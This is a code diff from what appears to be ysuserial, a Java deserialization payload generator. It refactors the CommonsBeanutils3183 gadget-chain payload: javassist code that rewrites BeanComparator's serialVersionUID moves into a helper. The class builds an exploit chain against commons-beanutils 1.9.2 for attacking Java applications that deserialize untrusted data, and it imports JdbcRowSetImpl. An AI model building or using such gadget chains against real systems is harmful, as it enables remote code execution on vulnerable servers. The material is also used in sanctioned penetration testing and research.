@@ -4,7 +4,6 @@ import com.sun.rowset.JdbcRowSetImpl;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.CtField;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.SuClassLoader;
@@ -12,6 +11,8 @@ import org.su18.ysuserial.payloads.util.SuClassLoader;
 import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
+
+import static org.su18.ysuserial.payloads.util.Gadgets.insertField;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
 public class CommonsBeanutils3183 implements ObjectPayload<Object> {
@@ -28,13 +29,8 @@ public class CommonsBeanutils3183 implements ObjectPayload<Object> {
 		ClassPool pool = ClassPool.getDefault();
 		pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
 		final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
-		ctBeanComparator.defrost();
-		try {
-			CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
-			ctBeanComparator.removeField(ctSUID);
-		} catch (javassist.NotFoundException ignored) {
-		}
-		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
+
+		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
 
 		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
 		Reflections.setFieldValue(comparator, "property", null);
